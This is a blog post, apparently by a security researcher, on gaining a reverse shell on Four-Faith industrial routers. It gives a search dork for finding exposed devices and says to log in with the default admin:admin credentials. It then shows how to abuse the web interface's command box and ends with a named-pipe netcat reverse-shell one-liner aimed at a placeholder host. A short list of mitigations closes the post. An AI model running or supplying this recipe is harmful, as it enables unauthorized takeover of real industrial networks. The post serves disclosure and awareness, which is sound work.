=== Content from medium.com_3210a909_20250120_232953.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F121c4dedb0d8&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40bertinjoseb%2Ffour-faith-industrial-routers-command-injection-rce-reverse-shell-121c4dedb0d8&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40bertinjoseb%2Ffour-faith-industrial-routers-command-injection-rce-reverse-shell-121c4dedb0d8&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Four Faith Industrial routers Command Injection RCE Reverse Shell

[![@bertinjoseb](https://miro.medium.com/v2/resize:fill:88:88/0*XIOmKZzYAxh6AEsa.jpg)](/%40bertinjoseb?source=post_page---byline--121c4dedb0d8--------------------------------)

[@bertinjoseb](/%40bertinjoseb?source=post_page---byline--121c4dedb0d8--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F4e5f5dee1e9e&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40bertinjoseb%2Ffour-faith-industrial-routers-command-injection-rce-reverse-shell-121c4dedb0d8&user=%40bertinjoseb&userId=4e5f5dee1e9e&source=post_page-4e5f5dee1e9e--byline--121c4dedb0d8---------------------post_header-----------)

4 min read·May 9, 2019

--

Listen

Share

After in depth analysis with several industrial routers available in the public internet , i found Chinese industrial routers from a manufacturer called “four faith” , this company offers a wide range of industrial communication solutions , one of them is the 3/4 G Industrial router solution.

![]()

In order to find them chose your favorite search engine and look up for the following strings “httpd\_four-faith” there are several variations from four faith routers models, that dork find all of them, but the vulnerability is located in the ones that contains “four-faith(build-x.x.x.x)”

![]()

When you get connected to the web application will find something like this :

![]()

The defaults are admin:admin , as far as we know defaults are a common issue in devices like industrial routers or embed devices for industrial applications, nothing exciting at this point, but let’s take a look in the web application in order to find some issues that could be exploitable in someway.

![]()

The default username is “admin”

The first thing that i noticed as interesting break point is the diagnostics options available in the administration tab, then look for “commands” tab in order to get the options to execute shell commands .

![]()

So yeah, those guys decided to put a “smart” command shell in order to execute commands , make sense that this could be an interesting entry point for command injection , so probably you’re thinking that this is going to be easy as hell, well let’s see if is possible to get a reverse shell from that execution shell box.

Let’s play with some commands first:

![]()![]()![]()

As you can see basically we have command execution partially, i tried to execute NC but seems like can not be executed easily, so won’t be easy to get a reverse shell in this way

![]()

In order to confirm my theory i tested the NC command directly in order to get a reverse shell , but didn’t work as expected .

![]()

If you try this, won’t work, you taught that would be easy?

So we need to figure out how to get the shell back to our server, and is when bash comes to save our day, basically we can use bash only in order to emulate what netcat does , creating a descriptor assigned to a network node , then with that descriptor we can read and write , at this point sounds awesome, but how we can achieve that ?

Jeff price explained all this in the following post : <https://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498> , another interesting post about this technique :

<https://labs.neohapsis.com/2008/04/17/connect-back-shell-literally/>

As usual setup your machine in order to listen with netcat with your preferred port following the Jeff example we can create the descriptor in the following way :

![]()

Reading the comments about that technique seems like don’t work in many environments, fortunately works as expected in the four-faith router architecture.

The definite payload in order to get a reverse interactive shell from the four faith routers is the following :

ls /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xxx.xxx.xxx.xxx 1337 >/tmp/f

![]()

Few seconds after that you will have your interactive shell in your vps or remote server, and for sure you can execute commands :

![]()

Conclusions

* Change default credentials first of all
* Assign network firewall rules for out-coming traffic
* Apply port filtering
* If you’re not using the web application , why is up and running and publish in the internet?
* This is an interesting entry point in order to pivot or compromise other devices in the OT network .
* Several OT / IoT devices comes with this “shell built-in” solutions, so just be care full with that, and you are already aware about what could happen in worst case scenario.

![]()[Exploit](/tag/exploit?source=post_page-----121c4dedb0d8--------------------------------)[Cybersecurity](/tag/cybersecurity?source=post_page-----121c4dedb0d8--------------------------------)[Reverse Shell](/tag/reverse-shell?source=post_page-----121c4dedb0d8--------------------------------)[Remote Code Execution](/tag/remote-code-execution?source=post_page-----121c4dedb0d8--------------------------------)[Hacking](/tag/hacking?source=post_page-----121c4dedb0d8--------------------------------)

--

--

[![@bertinjoseb](https://miro.medium.com/v2/resize:fill:96:96/0*XIOmKZzYAxh6AEsa.jpg)](/%40bertinjoseb?source=post_page---post_author_info--121c4dedb0d8--------------------------------)[![@bertinjoseb](https://miro.medium.com/v2/resize:fill:128:128/0*XIOmKZzYAxh6AEsa.jpg)](/%40bertinjoseb?source=post_page---post_author_info--121c4dedb0d8--------------------------------)Follow[## Written by @bertinjoseb](/%40bertinjoseb?source=post_page---post_author_info--121c4dedb0d8--------------------------------)[102 Followers](/%40bertinjoseb/followers?source=post_page---post_author_info--121c4dedb0d8--------------------------------)·[321 Following](/%40bertinjoseb/following?source=post_page---post_author_info--121c4dedb0d8--------------------------------)

Computer/Network security researcher X : bertinjoseb

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----121c4dedb0d8--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----121c4dedb0d8--------------------------------)[About](/about?autoplay=1&source=post_page-----121c4dedb0d8--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----121c4dedb0d8--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----121c4dedb0d8--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----121c4dedb0d8--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----121c4dedb0d8--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----121c4dedb0d8--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----121c4dedb0d8--------------------------------)[Teams](/business?source=post_page-----121c4dedb0d8--------------------------------)


